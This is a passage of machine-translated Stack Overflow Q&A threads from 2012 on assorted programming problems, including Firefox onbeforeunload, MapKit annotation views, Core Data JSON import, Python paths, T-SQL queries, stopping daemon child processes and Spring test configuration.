我感觉这会导致错误，因为“名称”/“电子邮件”列中的一列或两列在您的 Place 和 User 表中不明确。

与您的解决方案一样，您可以编写指定表的列：

```
Place::find(1)->users()->get(array('users.name','users.email')); 
```

# javascript - 在 Firefox 中卸载之前

> ID：12264852
> 
> 赞同：1
> 
> 时间：2012-09-04T13:45:53.967
> 
> 标签：javascript, browser, dom-events, onbeforeunload

```
<script type="text/javascript">
        var sessionID = getQuerystring('SessionID');
        var cookieSessionID = getCookie('session');
        var validNavigation = false;

        function endSession() {
            setCookie('session', sessionID, 1);
            var cookieSU = getCookie('session');
            if (cookieSU != null) {
                getSyncData('strSessionId=' + sessionID, 'UpdateUserLogoutSession');
            }
        }

        function wireUpEvents() {
            window.onbeforeunload = function () {
                if (!validNavigation) {
                    endSession();
                }
            }

            $('document').bind('keypress', function (e) {
                if (e.keyCode == 116) {
                    validNavigation = true;
                }
            });

            $("a").bind("click", function () {
                validNavigation = true;
            });

            $("form").bind("submit", function () {
                validNavigation = true;
            });

            $("input[type=submit]").bind("click", function () {
                validNavigation = true;
            });

        }

        $(document).ready(function () {
            if (cookieSessionID == null || cookieSessionID != sessionID) {
                // Do nothing
            } else {
                if (cookieSessionID == sessionID) {
                    getData('strSessionId=' + sessionID, 'UpdateUserResetSession', function (result) {
                        if (result['Exception']) { };
                    });
                }
            }
            wireUpEvents();
        });

        function setCookie(c_name, value, exdays) {
            var exdate = new Date();
            exdate.setDate(exdate.getDate() + exdays);
            var c_value = escape(value) + ((exdays == null) ? "" : "; expires=" + exdate.toUTCString());
            document.cookie = c_name + "=" + c_value;
        }
        function getCookie(c_name) {
            var i, x, y, ARRcookies = document.cookie.split(";");
            for (i = 0; i < ARRcookies.length; i++) {
                x = ARRcookies[i].substr(0, ARRcookies[i].indexOf("="));
                y = ARRcookies[i].substr(ARRcookies[i].indexOf("=") + 1);
                x = x.replace(/^\s+|\s+$/g, "");
                if (x == c_name) {
                    return unescape(y);
                }
            }
        }
    </script> 
```

我在这里打电话

```
UpdateUserLogoutSession 
```

在

```
window.onbeforeunload 
```

事件...

现在的问题是这在 IE 和 Chrome 上运行良好..但它在 Firefox 浏览器上不起作用......

这个函数识别页面是REFRESHED还是Closed........所以我想用

```
UpdateUserResetSession 
```

在刷新事件和

```
UpdateUserLogoutSession 
```

在关闭..！

有没有办法在 Firefox 中做到这一点？为什么它不起作用？还有一件事....如果我把

```
alert("hi"); 
```

后

```
setCookie('session', sessionID, 1);
            var cookieSU = getCookie('session');
            if (cookieSU != null) {
                getSyncData('strSessionId=' + sessionID, 'UpdateUserLogoutSession');
            } 
```

它很好用..但是当我尝试没有警报时..它不起作用？

有什么问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-26T23:38:44.463

I had this same problem and this is what finally worked for me (using jQuery):

```
$(window).bind('beforeunload', function(){

}); 
```

# objective-c - 以编程方式更改 MKAnnotationView

> ID：12264854
> 
> 赞同：0
> 
> 时间：2012-09-04T13:45:59.413
> 
> 标签：objective-c, mkannotationview

有没有办法改变 MKAnnotationView 样式（比如从带有数字的红色标签到带有数字的绿色标签）。

我想根据与目标的距离来改变这种风格。我的注释随着用户一起移动。

我不想使用删除/添加注释，因为它会导致“闪烁”。可以以某种方式完成吗？

**更新**：

我正在添加代码，我现在是怎么做的

```
MKAnnotationView *av = [mapView viewForAnnotation:an];

if ([data->type isMemberOfClass:[UserAnnotationImage class]])
{
    UIImage *img = [UIImage imageNamed: ((UserAnnotationImage *)data->type)->url];
    [av setImage:img];
}
else if ([data->type isMemberOfClass:[UserAnnotationLabel class]])
{

    UIView * v = [av viewWithTag:0];
    v = ((UserAnnotationLabel *)data->type)->lbl;

    av.frame = ((UserAnnotationLabel *)data->type)->lbl.frame;
}
else if ([data->type isMemberOfClass:[UserAnnotationView class]])
{

    UIView * v = [av viewWithTag:0];
    v = ((UserAnnotationView *)data->type)->view;
    av.frame = ((UserAnnotationView *)data->type)->view.frame;
} 
```

可悲的是，它不起作用:(

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-04T14:24:25.463

是的，基本上你得到一个注解视图的引用并直接更新它的内容。

另一种方法，如果你有一个自定义的注解视图类，是让注解视图监控它感兴趣的变化（或者有一些外部的东西告诉它）并更新自己。

如果您使用普通的`MKAnnotationView`或`MKPinAnnotationView`.

无论您在哪里检测到需要对视图进行更改，都可以通过调用地图视图的`viewForAnnotation` *实例方法*来获取对视图的引用。这与调用`viewForAnnotation`委托方法不同。

获得对视图的引用后，您可以根据需要进行修改，并且更改应立即出现。

重要的一点是，您用于更新委托方法之外的视图的逻辑与您在`viewForAnnotation`委托方法中的逻辑必须匹配。这是因为地图视图稍后可能会调用委托方法（在您手动更新视图之后），并且当它调用时，那里的代码应该考虑更新的数据。

最好的方法是将注释视图构造代码放在一个由委托方法调用的公共方法中，并在其中手动更新视图。

有关仅更新注释视图的示例，请参阅[从 MKMapView 中的 MKAnnotation 更改 UIImage](https://stackoverflow.com/questions/6808792/change-uiimage-from-mkannotation-in-the-mkmapview)`image`。

有关使用自定义注释视图类更新视图的*示例（主要是一种方法的想法），请参阅*[iPad Mapkit - Change title of "Current Location"](https://stackoverflow.com/questions/4324744/ipad-mapkit-change-title-of-current-location)定期更新视图的引脚颜色（绿色、紫色、红色、绿色、紫色、红色等）。

* * *

您的代码中有太多未知数，无法解释为什么它不起作用。例如：

*   是什么`data`？它是特定于注释的（是否与 相关`an`）？是什么`type`？将注记添加到地图后是否会发生变化？
*   为什么要`data`存储整个视图对象，例如 a `UILabel`or`UIView`而不是您要在这些视图中显示的基础数据？
*   `imageNamed`要求图像是项目中的资源（不是任意 url）
*   不要使用标签`0`（这是所有视图的默认设置）。从 开始编号`1`。
*   您使用 viewWithTag 获得一个视图，然后立即将其替换为另一个视图。

相反，我将给出一个更详细但更简单（r）的*示例*......

`MKAnnotation`假设您有一个具有以下属性（除了坐标、标题和副标题）的注释类（实现的类）：

```
@property (nonatomic, assign) BOOL haveImage;
@property (nonatomic, copy) NSString *labelText;
@property (nonatomic, copy) NSString *imageName;
@property (nonatomic, assign) CLLocationDistance distanceFromTarget; 
```

为了解决上面提到的“重点”（`viewForAnnotation`委托方法和视图更新代码应该使用相同的逻辑），我们将创建一个方法，该方法传递一个注释视图并根据注释的属性根据需要对其进行配置. `viewForAnnotation`然后，委托方法和注释属性更改时手动更新视图的代码都将调用此方法。

在这个例子中，我这样做是为了让注释视图显示图像，否则它会显示标签`haveImage`。`YES`此外，标签的背景颜色基于`distanceFromTarget`：

```
-(void)configureAnnotationView:(MKAnnotationView *)av
{
    MyAnnotationClass *myAnn = (MyAnnotationClass *)av.annotation;

    UILabel *labelView = (UILabel *)[av viewWithTag:1];

    if (myAnn.haveImage)
    {
        //show image and remove label...
        av.image = [UIImage imageNamed:myAnn.imageName];
        [labelView removeFromSuperview];
    }
    else
    {
        //remove image and show label...
        av.image = nil;

        if (labelView == nil)
        {
            //create and add label...
            labelView = [[[UILabel alloc] 
                initWithFrame:CGRectMake(0, 0, 50, 30)] autorelease];
            labelView.tag = 1;
            labelView.textColor = [UIColor whiteColor];
            [av addSubview:labelView];
        }

        if (myAnn.distanceFromTarget > 100)
            labelView.backgroundColor = [UIColor redColor];
        else
            labelView.backgroundColor = [UIColor greenColor];

        labelView.text = myAnn.labelText;
    }
} 
```

`viewForAnnotation`委托方法如下所示：

```
-(MKAnnotationView *)mapView:(MKMapView *)mapView viewForAnnotation:(id<MKAnnotation>)annotation 
{
    if ([annotation isKindOfClass:[MyAnnotationClass class]])
    {
        static NSString *myAnnId = @"myann";
        MKAnnotationView *av = [mapView dequeueReusableAnnotationViewWithIdentifier:myAnnId];
        if (av == nil)
        {
            av = [[[MKAnnotationView alloc] initWithAnnotation:annotation reuseIdentifier:myAnnId] autorelease];
        }
        else
        {
            av.annotation = annotation;
        }

        [self configureAnnotationView:av];

        return av;
    }

    return nil;
} 
```

最后，注解的属性发生变化的地方和你想要更新注解视图的地方，代码看起来像这样：

```
ann.coordinate = someNewCoordinate;
ann.distanceFromTarget = theDistanceFromTarget;
ann.labelText = someNewText;
ann.haveImage = YES or NO;
ann.imageName = someImageName;

MKAnnotationView *av = [mapView viewForAnnotation:ann];
[self configureAnnotationView:av]; 
```

# asp.net - 下划线JS模板如果循环问题

> ID：12264855
> 
> 赞同：0
> 
> 时间：2012-09-04T13:46:01.080
> 
> 标签：asp.net, asp-classic, tooltip

我正在尝试`rel="tooltip"`根据 if 条件添加属性 ()

```
<div class="symbol"><span title="<%= data%>" <% if ( data.length > 9 ) { rel="tooltip" }%>></span></div> 
```

如果我在 if 循环中添加警报，它会起作用，而属性更改不起作用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:54:47.123

这与 JavaScript（或 Underscore.js）完全无关。

`<% %>`是 ASP 标签，`rel="tooltip"`只是设置一个变量。您需要让 ASP 回`"tooltip"`显（就像您对标题所做的那样）。

```
<div class="symbol"><span title="<%= data %>" rel="<%= data.length > 9 ? "tooltip" : "" %>></span></div> 
```

# java - 为什么Netty的ExecutorUtil.terminate()调用ExecutionHandler.shutdownNow()？

> ID：12264858
> 
> 赞同：0
> 
> 时间：2012-09-04T13:46:13.823
> 
> 标签：java, netty

我必须使用 netty 3.5.1 管理具有 > 1K 连接客户端的客户端服务器应用程序。有时，当我们通过重新启动服务器断开客户端连接时，写入数据库的更新会丢失。当执行重启/关闭时，我们像这样关闭我们的 Netty 组件：

*   关闭服务器通道
*   断开所有客户端（通过 ChannelGroupFuture）
*   在我们的 ChannelPipeline 上调用 releaseExternalResources()
*   在我们的 ExecutionHandler 上调用 releaseExternalResources() ，它是我们 ChannelPipeline 的一部分（是否需要手动调用它？）

但是我想知道为什么是 ExecutorUtil。*terminate*（由 ExecutionHandler 调用）对传递的 ExecutorService 执行 shutdownNow，因为*shutdownNow**会*耗尽队列中的所有现有任务并返回它们。这些任务不会被执行，因为 ExecutorUtil. *terminate*是*void*类型。*在 ExecutorService 上调用shutdown*并等待完成不是更合适吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-08T11:23:54.100

这是一个很好的建议。你介意在我们的问题跟踪器上打开一个问题吗[1]

[1]https://github.com/netty/netty/issues

# php - 使用文档链接向表单用户发送电子邮件

> ID：12264859
> 
> 赞同：0
> 
> 时间：2012-09-04T13:46:14.937
> 
> 标签：php, forms

我有一个非常通用的表格。我希望用户输入他们的电子邮件地址，选择他们希望收到的任何文档，并希望生成一封电子邮件，其中包含他们选择的文档的下载链接。我过去也这样做过，但我的大脑一片空白。感谢您提供的任何帮助！谢谢。

这是表格：

```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0
Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>My Form</title>
</head>

<body>
<form method="post" action="autoreply.php">
  <label class="description" for="email">Your Email Address</label>
  <input id="email" name="email" class="element text medium" type="text" maxlength="255" value=""/>
  <br />
  Document 1:
  <input type="checkbox" name="document[]" value="document1" />
  <br />
  Document 2:
  <input type="checkbox" name="document[]" value="document2" />
  <br />
  Document 3:
  <input type="checkbox" name="document[]" value="document3" />
  <br />
  <br />
  <input type="hidden" name="send" value="1" />
  <input type="submit" value="Submit" />
</form>
</body>
</html> 
```

这是我的PHP：

```
<?php 
if(isset($_POST) && ($_POST['send'] == 1)){ 

    $documents = array( 
                    'document1' => 'http://www.example.com/document1.doc', 
                    'document2' => 'http://www.example.com/document2.doc', 
                    'document3' => 'http://www.example.com/document3.doc' 
                ); 

    $to      = '$email'; 
    $subject = 'the subject'; 
    $message = "hello\n\n"; 

    if(isset($_POST['document']) && count($_POST['document']) > 0){ 
        foreach($_POST['document'] as $doc){ 
            if(isset($documents[$doc])){ 
                $message .= "Here is ".$documents[$doc]."\n"; 
            } 
        } 
    } 

    $headers = 'From: webmaster@example.com' . "\r\n" . 
        'Reply-To: webmaster@example.com' . "\r\n" . 
        'X-Mailer: PHP/' . phpversion(); 

    mail($to, $subject, $message, $headers); 
} 
?> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T13:55:07.217

您应该使用附件包含到文档中，或者如果文档是纯文本，则将它们包含在您的消息中。

当您想包含附件时，最方便的是使用现成的邮件程序类，例如[swift mailer](http://swiftmailer.org/)。

如果您想在您的消息中包含文档，您应该使用以下内容：

```
if(isset($_POST['document']) && count($_POST['document']) > 0){ 
        foreach($_POST['document'] as $doc){ 
            if(isset($documents[$doc])){ 
                $message .= "Here is ".$documents[$doc]."\n\n";
                $message .= file_get_contents( filename_of($documents[$doc]) ); 
            } 
        } 
} 
```

当然，您必须编写一个函数来从文档名称中获取文件名。

# ios - 使用 RSAPI 将 JSON 保存到 Core Data

> ID：12264861
> 
> 赞同：1
> 
> 时间：2012-09-04T13:46:21.463
> 
> 标签：ios, json, parsing, core-data

我正在尝试将 JSON 从 Web 服务解析为 Core Data。我查看了 RSAPI 库，但我真的不明白如何在我的情况下使用它。到目前为止，我用来获取 JSON 数据的方法是：`json = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:&error]; NSData *data = [NSData dataWithContentsOfURL:url];`然后在我的 tableview 中将其显示为数组。关于如何将 JSON 数据保存到我的自定义实体的核心数据中的任何建议？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-04T14:32:11.823

**简单/危险的方式**

Cocoa 提供了一种方法，使这变得非常简单。多亏了键值编码，NSObject 中有一个方法可以将上述内容简化为一行：

`[myObj setValuesForKeysWithDictionary:jsonDict];`

这将通过 jsonDict 中的键/值对运行，并在 myObj 上设置相同的键/值对。唯一需要注意的是键名必须匹配，但假设您在数据模型中将它们命名为相同，这应该不是问题。

实际上还有一个警告，这是一个大问题。在此方法中，字典中包含的键确定在托管对象上使用哪些键。但是，如果字典包含不属于实体描述的键怎么办？然后，您的应用程序崩溃，并显示有关对象如何不符合键的键值编码的错误。在此处使用此方法会使您的应用程序的稳定性受制于您正在使用的 Web 服务。如果您对 Web 服务没有绝对控制权，那么在此处使用此方法将面临严重风险。我们可以做得更好。

**检查托管对象**

由于我们使用的是 Core Data，我们可以使用 NSEntityDescription 来检查托管对象的属性并扭转上述逻辑。我们可以使用托管对象，而不是使用传入的字典来确定要使用的键/值对。

您可以通过询问其实体来查找托管对象的实体描述。这会给你一个 NSEntityDescription ，然后你可以询问各种有用的信息，比如存在哪些属性。从 JSON 转换时，这会导致更安全的方法：

```
NSDictionary *attributes = [[myObj entity] attributesByName];
for (NSString *attribute in attributes) {
id value = [jsonDict objectForKey:attribute];
if (value == nil) {
    continue;
}
[myObj setValue:value forKey:attribute];
} 
```

此代码遍历实体的属性，在字典中为每个属性查找一个键，并将该键/值对应用于托管对象。这仍然很好且通用，并且具有对传入数据的更改不会再使应用程序崩溃的优点。它仅在字典中查找实体描述中实际存在的属性的值。额外的字典键被简单地忽略。

检查 nil 是因为代码确实命中了实体的所有属性。如果实体具有传入数据中不存在的任何属性（例如，“收藏夹”标志），则代码最终会为该属性设置 nil 值。这可能会导致意外清除您真正想要保留的数据。

**处理损坏和不一致的 JSON**

JSON标准非常清楚如何区分字符串和数字——基本上，字符串被引号包围而数字不是。然而，JSON Web 服务并不总是能很好地满足这个要求。即使它们是，它们也并不总是从一个记录到另一个记录是一致的。

一个例子，类似于我最近遇到的一个例子：服装的尺码信息。大小由 Web 服务提供，通常为“30-32”、“34-36”等。这些在 JSON 中被正确引用为字符串，应用程序将它们保存为字符串属性并显示给用户照原样。

但有时大小只有一个数字，例如“8”、“10”等。在这种情况下，服务器会丢弃引号，使其成为数字。我的 JSON 解析器正确地生成了一个 NSNumber。只有我想把它保存在我实体的字符串属性中！我可以使用 Objective-C 内省来查看我是否从我的 JSON 解析器接收到 NSString 或 NSNumber，但我还需要知道托管对象对属性的期望类型。我曾短暂地考虑过破坏我的 JSON 解析器，以便它始终返回 NSString，所以至少我会知道对它有什么期望。幸运的是 NSEntityDescription 又来了。

除了询问实体描述其属性名称是什么外，您还可以查询Core Data模型中配置的属性类型。这作为 NSAttributeType 返回。使用它，我们可以扩展上面的代码来处理不匹配的数据类型。抽象代码以便于重用可能也是一个好主意，所以我将它放在 NSManagedObject 上的一个类别中：

```
@implementation NSManagedObject (safeSetValuesKeysWithDictionary)

- (void)safeSetValuesForKeysWithDictionary:(NSDictionary *)keyedValues

{
    NSDictionary *attributes = [[self entity] attributesByName];
    for (NSString *attribute in attributes) {
        id value = [keyedValues objectForKey:attribute];
        if (value == nil) {
            // Don't attempt to set nil, or you'll overwite values in self that aren't present in keyedValues
            continue;
        }
        NSAttributeType attributeType = [[attributes objectForKey:attribute] attributeType];
        if ((attributeType == NSStringAttributeType) && ([value isKindOfClass:[NSNumber class]])) {
            value = [value stringValue];
        } else if (((attributeType == NSInteger16AttributeType) || (attributeType == NSInteger32AttributeType) || (attributeType == NSInteger64AttributeType) || (attributeType == NSBooleanAttributeType)) && ([value isKindOfClass:[NSString class]])) {
            value = [NSNumber numberWithInteger:[value  integerValue]];
        } else if ((attributeType == NSFloatAttributeType) && ([value isKindOfClass:[NSString class]])) {
            value = [NSNumber numberWithDouble:[value doubleValue]];
        }
        [self setValue:value forKey:attribute];
    }
}
@end 
```

此代码检查我们从传入 JSON 创建的字典中找到的值的类型和托管对象上的属性，如果存在字符串/数字不匹配，它会修改值以确保它与预期匹配。

这变得非常有用。它不仅是一个通用的 JSON 到 NSManagedObject 的转换，它还可以处理数字和字符串类型之间的不匹配，而不需要任何实体特定的信息。不过，它可能会更好。处理日期

JSON 没有日期类型，但日期在 JSON 中很常见。它们只是使用一种或另一种日期格式表示为字符串。只有你可能想要一个 NSDate，而不是一个字符串。NSDateFormatter 在这里真的很有用，但是让日期转换也通用化不是很好吗，所以你不需要特殊情况下你的日期属性？你能看到我要去哪里吗？

编写了上面的 category 方法后，添加一个可选的 NSDateFormatter 参数并在实体的属性需要一个日期时使用它并没有太多工作。这个修改后的版本在“else ... if”链中添加了该参数和一个额外的案例：

```
@implementation NSManagedObject (safeSetValuesKeysWithDictionary)

- (void)safeSetValuesForKeysWithDictionary:(NSDictionary *)keyedValues dateFormatter:(NSDateFormatter *)dateFormatter
{
    NSDictionary *attributes = [[self entity] attributesByName];
    for (NSString *attribute in attributes) {
        id value = [keyedValues objectForKey:attribute];
        if (value == nil) {
            continue;
        }
        NSAttributeType attributeType = [[attributes objectForKey:attribute] attributeType];
        if ((attributeType == NSStringAttributeType) && ([value isKindOfClass:[NSNumber class]])) {
            value = [value stringValue];
        } else if (((attributeType == NSInteger16AttributeType) || (attributeType == NSInteger32AttributeType) || (attributeType == NSInteger64AttributeType) || (attributeType == NSBooleanAttributeType)) && ([value isKindOfClass:[NSString class]])) {
            value = [NSNumber numberWithInteger:[value integerValue]];
        } else if ((attributeType == NSFloatAttributeType) &&  ([value isKindOfClass:[NSString class]])) {
            value = [NSNumber numberWithDouble:[value doubleValue]];
        } else if ((attributeType == NSDateAttributeType) && ([value isKindOfClass:[NSString class]]) && (dateFormatter != nil)) {
            value = [dateFormatter dateFromString:value];
        }
        [self setValue:value forKey:attribute];
    }
}
@end 
```

# python - 设置python路径

> ID：12264863
> 
> 赞同：4
> 
> 时间：2012-09-04T13:46:27.310
> 
> 标签：python, django, path

我有一个 Django 应用程序，每当我尝试运行我的代码时都会出现错误：

```
Error: No module named django_openid 
```

让我退后一步，告诉你我是怎么做到的：

1.  我格式化了我的计算机并完全重新安装了所有东西——包括 virtualenv，以及我的项目所需的所有依赖包（除了 Django），基于我的 requirements.txt 文件夹中的设置
2.  我试着做`python manage.py syncdb`并得到了错误

我用谷歌搜索了这个问题，很多人说这可能是路径问题。

我对如何更改路径变量以及它们的确切含义感到困惑。我找到了一些文档，但有点像 hack-ish 菜鸟，这让我有点不知所措。

所以我的问题是：

1.  它们的目的究竟是什么——它们是基于 Python 版本的基于系统的级别，还是依赖于项目？
2.  我怎样才能看到我的当前设置是什么？
3.  我该如何更改它们（即他们谈论的这个 .profile 文件在哪里，我可以只使用文本编辑器吗）

您的任何输入都会很棒，因为这让我很困惑，我只想重新开始编写代码:-)

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-04T13:50:21.573

这`path`只是你文件系统中的位置，python 将在其中搜索你试图导入的模块。例如，当您运行时，Python 将在路径（变量）中包含的所有位置中`import somemodule`执行搜索。`somemodule``sys.path`

您应该检查模块中的`path`属性`sys`：

```
import sys
print sys.path 
```

它只是一个常规列表，因此您可以从中添加/删除元素：

```
sys.path.append('/path/to/some/module/folder/') 
```

如果你想改变你启动的每个 python 会话的路径，你应该创建一个在启动时加载的文件，这样做：

1.  创建一个`PYTHONSTARTUP`环境变量并将其设置为您的启动文件。例如：（`PYTHONSTARTUP=/home/user/.pythonrc`在 unix shell 中）；
2.  编辑启动文件，使其包含您希望在加载 python 时自动执行的命令；

a 的一个例子`.pythonrc`可能是：

```
import sys
sys.path.append('/path/to/some/folder/') 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-04T14:27:34.120

你*真的*需要改变路径吗？最好先真正考虑你的原因。如果您只打算在服务器上运行单个应用程序，或者您只是不关心使用可能不必要的包污染系统包目录，则将所有内容放在主系统站点包或 dist-packages 目录中。否则，使用 virtualenv。

系统级包目录始终在路径上。Virtualenv 激活时会将其 site-packages 目录添加到路径中，Django 将在激活时将项目目录添加到路径中。不需要在路径中添加任何其他内容，实际上这是您在实践中永远不必担心的事情。

# tsql - 查询结果中的一系列记录

> ID：12264868
> 
> 赞同：1
> 
> 时间：2012-09-04T13:46:35.447
> 
> 标签：tsql

我想知道是否有一些简单的方法、函数或其他方法可以从具有以下结果的查询中返回数据。

我有一个 SQL Express DB 2008 R2，一个包含给定列中的数字数据的表，比如 col T。

我在代码中获得了一个值 X，并希望返回最多三个记录。col T 等于我的值 X 的记录，以及之前和之后的记录，仅此而已。排序在 col T 上完成。之前的记录可能是文件的开头，因此不存在，同样，如果 X 等于最后一条记录，那么后面的记录将不存在，即文件/表的结尾。

表中可能不存在 X 的值。

我认为这类似于按数字顺序获得一系列结果。

任何解决此问题的帮助或指导将不胜感激。

再次感谢，

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-04T13:51:18.287

它可能不是最佳解决方案，但是：

```
SELECT T
FROM theTable
WHERE T = X
UNION ALL
SELECT *
FROM 
(
    SELECT TOP 1 T
    FROM theTable
    WHERE T > X
    ORDER BY T
) blah
UNION ALL
SELECT *
FROM
(
    SELECT TOP 1 T
    FROM theTable
    WHERE T < X
    ORDER BY T DESC
) blah2 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T16:12:46.990

```
DECLARE @x int = 100

;WITH t as 
(
    select ROW_NUMBER() OVER (ORDER BY T ASC) AS row_nm,*
    from YourTable
)
, t1 as
(
    select *
    from t
    WHERE T = @x
)
select *
from t 
CROSS APPLY t1
WHERE t.row_nm BETWEEN t1.row_nm -1 and t1.row_nm + 1 
```

# bash - 杀死一个守护进程的所有子进程

> ID：12264869
> 
> 赞同：1
> 
> 时间：2012-09-04T13:46:45.013
> 
> 标签：bash, subprocess, kill, init.d, lsb

我正在写一个`/etc/init.d/mydaemon`：

```
# ...
source functions # LSB compliant 

EXEC=/usr/local/bin/mydaemon
PROG=mydaemon

function start() {
  daemon --pidfile=/var/run/mydeamon.pid ${EXEC}
}

function stop() {
  killproc ${PROG}
}

# ... 
```

我的`/usr/local/bin/mydaemon`：

```
#!/bin/bash
trap "trap TERM ; kill 0" TERM
binary with some args 
```

AFAIK，这应该有效，因为：

*   `daemon``mydaemon`将的 PID记录在`/var/run/mydaemon.pid`
*   `killproc`读取该PID并发`SIGTERM`送到该PID。
*   `mydaemon`陷阱这个信号，禁用陷阱并发`SIGTERM`送到整个`PGRP`，包括进程`binary with some args`。

但是，这不起作用。停止服务后，`mydaemon`终止，但`binary`仍在运行。

我错过**了什么，停止守护进程及其所有子进程的最佳做法是什么？**

* * *

顺便提一句：

当我的 /usr/local/bin/mydaemon 是：

```
#!/bin/bash
binary with some args &
echo $! $$ > /var/run/mydaemon.pid
wait 
```

它工作正常，但这对我来说似乎不太健壮，而且有时这是不合适的（当二进制调用不那么直接，或者它有自己的孩子时，等等）。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-04T13:59:43.823

如果您将父进程的 id 提供给 pkill，它将杀死所有子进程：

```
pkill -TERM -P parentID 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-04T14:01:18.553

您可以设置一个`trap`，它在收到 SIGINT 时负责清理过程。例如：

```
function cleanup { kill $CHILDPID; exit 0; }
trap cleanup SIGINT SIGTERM 
```

有关更多示例，请参见[此处](http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_12_02.html)。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2020-11-19T05:25:07.850

对于问题中提出的具体情况，还值得考虑以下选项`/usr/local/bin/mydaemon`：

```
#!/bin/bash
exec binary with some args 
```

而不是在具有新 PID 的子进程中运行，`binary`而是接管 shell 进程 PID，从而直接接收来自 init 脚本的信号。

# css - 在 CSS 中使用 %：位置：绝对和图像大小

> ID：12264872
> 
> 赞同：1
> 
> 时间：2012-09-04T13:46:48.713
> 
> 标签：css

我正在尝试使用 % 设计一个流畅的布局，其中书籍位于窗口高度的 50% 处，下一本书的四分之一可见，让人想向下滚动。

调整窗口大小不应改变布局，因此书籍的图像大小、边距等应以 % 给出。

但是，`.books {position: absolute}`对于包含`div`s 的设置，包含的图像的大小会缩小到缩略图大小，尽管图像本身相当大......

% 作为单位如何工作？我认为 100% 始终是其包含元素的 100%。为什么要`position: absolute`改变这个？

第二个问题，即使在使用 % 时，仅更改窗口宽度也会更改垂直布局。我曾假设垂直和水平方向是独立的。

以下是一些代码片段。

```
<div id="container">
  <div class="books">
    <img src="..." />
  </div>
  <div class="books">
    <img src="..." />
  </div>
  <div class="books">
    <img src="..." />
  </div>
</div>

#container {
  height: 200%;
}
.books {
  height: 25%; /* =50% of window height */
} 
```

编辑：我找到了罪魁祸首：我分配了一个以 % 为单位的上边距，但所有（左上右下）边距值都定义为父级*宽度*的百分比......奇怪。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-05T07:27:29.190

将此添加到您的CSS

```
.books img {width:100%; height:100%} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-04T14:57:16.960

您需要指定所有父母的身高，直到 html 即

```
html, body{
    height: 100%;
}
#container {
    height: 200%;
}
.books{
    height: 25%; /* =50% of window height */
}
.books img{
    height: 100%;
} 
```

如果您更改为 position: absolute，那么父级将成为下一个位置父级，您可以通过将其设为 position: relative（或 position: absolute）来指定它。上面的代码意味着调整窗口大小会改变布局。但是你可以在链中的某个点设置一个特定的大小，或者用 javascript 来做？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-04T14:27:07.673

要回答关于 的问题`position: absolute`，该元素是相对于其第一个定位（非静态）祖先元素定位的，因此包含 div 的 % 变化将影响图像大小。来源：[点击这里](http://www.w3schools.com/cssref/pr_class_position.asp)

根据经验，您最终会在使用 % 宽度和高度的各种浏览器中遇到一些问题。根据检测到的正在使用的设备固定大小并提供多个样式表可能是更好的方法。

# java - 在 DAO 中注入 EntityManager 以进行内存数据库单元/集成测试？

> ID：12264876
> 
> 赞同：2
> 
> 时间：2012-09-04T13:46:57.667
> 
> 标签：java, spring, testing, entitymanager

我有一个小型 Spring Web 应用程序，具有典型的 MVC Service DAO JPA/Hibernate Persistence Layer 架构。在生产中，我使用类似 JTA 的持久性单元。DAO由容器注入一个`EntityManager`via的实例。`@PersistenceContext`一切皆好。

现在，我想使用内存数据库（在本地 pc 上的容器之外）测试我的 DAO 实现。我可以手动创建一个基于 RESOURCE_LOCAL 的`EntityManager`. 但是我怎样才能让它自动注入到我的 DAO 实现中呢？

我已经看到了这个[问题](https://stackoverflow.com/questions/3807638/how-to-inject-persistencecontext-during-unit-testing)，它表明 Spring 是可能的。但是怎么做？

当然，对于单元测试，我可以使用`new MyDAOImpl()`并注入`EntityManager`自己，但稍后，我会想要测试注入了 DAO 实现的服务。我想避免自己连接所有东西......这可能吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-04T13:54:09.053

在我们的项目中，我们定义了一个不同的 unit-testing-config.xml，其中定义了数据源 bean 以指向内存数据库，如下所示：

```
<bean id="dataSource" class="com.mchange.v2.c3p0.ComboPooledDataSource">
        <property name="driverClass" value="org.hsqldb.jdbc.JDBCDriver" />
        <property name="jdbcUrl"
                value="jdbc:hsqldb:file:/data/data.db" />
        <property name="user" value="sa" />
        <property name="password" value="" />
        <property name="initialPoolSize" value="1" />
        <property name="minPoolSize" value="1" />
        <property name="maxPoolSize" value="50" />
        <property name="maxIdleTime" value="240" />
        <property name="checkoutTimeout" value="60000" />
        <property name="acquireRetryAttempts" value="0" />
        <property name="acquireRetryDelay" value="1000" />
        <property name="numHelperThreads" value="1" />
</bean> 
```

正常`entityManagerFactory`定义如下将使用上面的`datasource`bean：

```
<bean id="entityManagerFactory"
    class="org.springframework.orm.jpa.LocalContainerEntityManagerFactoryBean">
    <property name="dataSource" ref="dataSource" />
    <property name="persistenceUnitName" value="myDoctorPersistenceUnit" />
    <property name="loadTimeWeaver">
        <bean
            class="org.springframework.instrument.classloading.InstrumentationLoadTimeWeaver" />
    </property>
    <property name="jpaVendorAdapter">
        <bean class="org.springframework.orm.jpa.vendor.HibernateJpaVendorAdapter">
            <property name="showSql" value="true" />
            <property name="generateDdl" value="true" />
            <property name="databasePlatform" value="org.hibernate.dialect.HSQLDialect" />
        </bean>
    </property>
